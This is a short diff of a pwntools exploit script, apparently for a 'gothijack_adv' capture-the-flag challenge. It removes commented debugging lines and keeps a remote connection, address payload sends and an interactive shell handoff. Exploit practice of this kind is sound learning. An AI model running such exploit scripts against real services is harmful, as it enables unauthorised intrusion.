@@ -1,6 +1,6 @@
 from pwn import *
 
-#r = gdb.debug('./gothijack_adv')
+
 r = remote("exp.zip", 56012)
 
 addr1 = b'404040'
@@ -20,8 +20,6 @@ r.recvuntil(b"addr1:")
 
 r.sendline(addr3)
 
-#r.recvuntil(b"addr2:")
 
-#r.sendline(addr4)
 
 r.interactive()
